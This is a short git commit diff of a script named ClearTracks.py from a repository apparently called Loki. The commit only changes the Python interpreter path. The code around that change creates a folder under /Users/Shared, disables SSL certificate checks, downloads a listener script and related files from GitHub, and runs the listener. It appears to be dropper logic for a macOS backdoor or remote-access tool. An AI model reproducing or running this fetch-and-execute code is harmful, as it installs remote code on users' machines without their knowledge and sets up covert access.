50725241b621f804d3a162e15625faf3d5745200
3-TA <77489816+3-TA@users.noreply.github.com>
2023-11-06 19:57:07 +0800

    Update ClearTracks.py

--- ClearTracks.py
+++ ClearTracks.py
@@ -12,7 +12,7 @@ try:
   os.mkdir ('/Users/Shared/Hermes')
   import time
   time.sleep (1.5)
-  os.system ("""/usr/bin/python -c 'import ssl; ssl._create_default_https_context = ssl._create_unverified_context; import time; time.sleep (1); import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py"); urllib.urlretrieve ("https:\
+  os.system ("""/usr/local/bin/python -c 'import ssl; ssl._create_default_https_context = ssl._create_unverified_context; import time; time.sleep (1); import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py"); urllib.urlretrieve ("https:\
 //github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt"); urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/Hermes/listener.command")'""")
   time.sleep (2)
   os.system ('sh /Users/Shared/Hermes/listener.command')
